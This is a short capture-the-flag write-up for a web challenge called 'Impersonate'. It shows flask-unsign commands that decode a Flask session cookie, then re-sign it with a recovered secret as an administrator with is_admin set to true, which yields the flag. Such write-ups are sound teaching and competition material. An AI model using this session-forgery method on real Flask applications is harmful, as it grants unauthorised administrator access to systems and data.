# Impersonate

One may not be the one they claim to be.

http://chal.competitivecyber.club:9999/

## Solution

logged in test/test, grabbed session
eyJpc19hZG1pbiI6ZmFsc2UsInVpZCI6ImY1NGUzMmI2LWQzOGMtNTJmZS1hNWY2LTIyZDYxMWFjN2EzMiIsInVzZXJuYW1lIjoidGVzdCJ9.Zu7tNg.9Ehs0weWCpo_7fsyXWKePYTiaWs

```sh
flask-unsign --decode --cookie 'eyJpc19hZG1pbiI6ZmFsc2UsInVpZCI6ImY1NGUzMmI2LWQzOGMtNTJmZS1hNWY2LTIyZDYxMWFjN2EzMiIsInVzZXJuYW1lIjoidGVzdCJ9.Zu7tNg.9Ehs0weWCpo_7fsyXWKePYTiaWs'
# {'is_admin': False, 'uid': 'f54e32b6-d38c-52fe-a5f6-22d611ac7a32', 'username': 'test'}

flask-unsign --unsign --cookie < cookie.txt
# failed

python3 solve.py

flask-unsign --sign --cookie "{'is_admin': False, 'uid': 'f54e32b6-d38c-52fe-a5f6-22d611ac7a32', 'username': 'test'}" --secret 'f40c0444c241120094e82d1280f81ded36995bdf4a8837d2a60a0b09779e6399'
# eyJpc19hZG1pbiI6ZmFsc2UsInVpZCI6ImY1NGUzMmI2LWQzOGMtNTJmZS1hNWY2LTIyZDYxMWFjN2EzMiIsInVzZXJuYW1lIjoidGVzdCJ9.Zu7y-A.za31TMpC8y_yjNX4EU-_io5Wul0

flask-unsign --sign --cookie "{'is_admin': True, 'uid': '02ec19dc-bb01-5942-a640-7099cda78081', 'username': 'administrator'}" --secret '157f7f7cddc7108879a8c670a7be77f6b624483292c566c6270b09bda9d64111'
# eyJpc19hZG1pbiI6dHJ1ZSwidWlkIjoiMDJlYzE5ZGMtYmIwMS01OTQyLWE2NDAtNzA5OWNkYTc4MDgxIiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.Zu7y0A.mVi49oPJTppd_q9M8zLu_KNX14M
```


```sh
python3 solve.py
# PCTF{Imp3rs0n4t10n_Iz_Sup3r_Ezz}
```